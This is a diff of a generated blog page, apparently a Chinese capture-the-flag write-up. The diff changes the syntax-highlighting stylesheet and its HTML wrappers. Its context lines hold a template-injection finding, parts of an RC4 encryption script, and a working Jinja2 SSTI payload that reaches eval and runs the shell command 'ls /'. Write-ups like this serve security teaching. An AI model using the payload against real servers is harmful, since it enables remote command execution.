@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -256,7 +264,7 @@
 <p>主要点：<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" srcset="/img/loading.gif" alt="03.png">      </p>
 <p>对传入的参数进行RC4解密，然后经过<code>render_template_string</code><br>这里存在SSTI      </p>
 <p>RC4加密脚本         </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
 <span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
 
 
@@ -295,7 +303,7 @@ enc_base64 = rc4_main(key, message)
 enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)
 enc_url = parse.quote(enc_init)
 print(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)
-<span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></code></pre></div></code></pre>
+<span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></code></pre></code></pre>
 <p>明文输入SSTI的payload：<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p>
 <p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" srcset="/img/loading.gif" alt="05.png">      </p>
 <p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" srcset="/img/loading.gif" alt="04.png">        </p>
@@ -446,6 +454,8 @@ print(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + e
 
 
 
+  
+    
   
 
 
